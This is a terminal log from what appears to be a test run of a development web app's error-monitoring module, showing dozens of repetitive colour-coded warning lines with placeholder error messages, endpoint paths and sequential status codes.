WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.942829Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m95[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4738'[0m [36merror_type[0m=[35merror_type_38[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_38[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m538[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.942876Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m95[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4739'[0m [36merror_type[0m=[35merror_type_39[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_39[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m539[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.942924Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m95[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4740'[0m [36merror_type[0m=[35merror_type_40[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_40[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m540[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.942972Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m95[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4741'[0m [36merror_type[0m=[35merror_type_41[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_41[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m541[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.943019Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m95[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4742'[0m [36merror_type[0m=[35merror_type_42[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_42[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m542[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.943067Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m95[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4743'[0m [36merror_type[0m=[35merror_type_43[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_43[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m543[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.943114Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m95[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4744'[0m [36merror_type[0m=[35merror_type_44[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_44[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m544[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.943161Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m95[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4745'[0m [36merror_type[0m=[35merror_type_45[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_45[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m545[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.943208Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m95[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4746'[0m [36merror_type[0m=[35merror_type_46[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_46[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m546[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.943257Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m95[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4747'[0m [36merror_type[0m=[35merror_type_47[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_47[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m547[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.943305Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m95[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4748'[0m [36merror_type[0m=[35merror_type_48[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_48[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m548[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.943353Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m95[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4749'[0m [36merror_type[0m=[35merror_type_49[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_49[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m549[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.943401Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m96[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4750'[0m [36merror_type[0m=[35merror_type_0[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_50[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m550[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.943448Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m96[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4751'[0m [36merror_type[0m=[35merror_type_1[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_51[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m551[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.943494Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m96[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4752'[0m [36merror_type[0m=[35merror_type_2[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_52[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m552[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.943543Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m96[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4753'[0m [36merror_type[0m=[35merror_type_3[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_53[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m553[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.943590Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m96[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4754'[0m [36merror_type[0m=[35merror_type_4[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_54[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m554[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.943690Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m96[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4755'[0m [36merror_type[0m=[35merror_type_5[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_55[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m555[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.943753Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m96[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4756'[0m [36merror_type[0m=[35merror_type_6[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_56[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m556[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.943807Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m96[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4757'[0m [36merror_type[0m=[35merror_type_7[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_57[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m557[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.943862Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m96[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4758'[0m [36merror_type[0m=[35merror_type_8[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_58[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m558[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.943911Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m96[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4759'[0m [36merror_type[0m=[35merror_type_9[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_59[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m559[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.943960Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m96[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4760'[0m [36merror_type[0m=[35merror_type_10[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_60[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m560[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.944008Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m96[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4761'[0m [36merror_type[0m=[35merror_type_11[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_61[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m561[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.944056Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m96[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4762'[0m [36merror_type[0m=[35merror_type_12[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_62[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m562[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.944106Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m96[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4763'[0m [36merror_type[0m=[35merror_type_13[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_63[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m563[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.944211Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m96[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4764'[0m [36merror_type[0m=[35merror_type_14[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_64[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m564[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.944275Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m96[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4765'[0m [36merror_type[0m=[35merror_type_15[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_65[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m565[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.944329Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m96[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4766'[0m [36merror_type[0m=[35merror_type_16[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_66[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m566[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.944381Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m96[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4767'[0m [36merror_type[0m=[35merror_type_17[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_67[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m567[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.944430Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m96[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4768'[0m [36merror_type[0m=[35merror_type_18[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_68[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m568[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.944480Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m96[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4769'[0m [36merror_type[0m=[35merror_type_19[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_69[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m569[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.944530Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m96[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4770'[0m [36merror_type[0m=[35merror_type_20[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_70[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m570[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.944579Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m96[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4771'[0m [36merror_type[0m=[35merror_type_21[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_71[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m571[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.944628Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m96[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4772'[0m [36merror_type[0m=[35merror_type_22[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_72[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m572[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.944676Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m96[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4773'[0m [36merror_type[0m=[35merror_type_23[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_73[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m573[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.944725Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m96[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4774'[0m [36merror_type[0m=[35merror_type_24[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_74[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m574[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.944772Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m96[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4775'[0m [36merror_type[0m=[35merror_type_25[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_75[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m575[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.944821Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m96[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4776'[0m [36merror_type[0m=[35merror_type_26[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_76[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m576[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.944869Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m96[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4777'[0m [36merror_type[0m=[35merror_type_27[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_77[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m577[0m
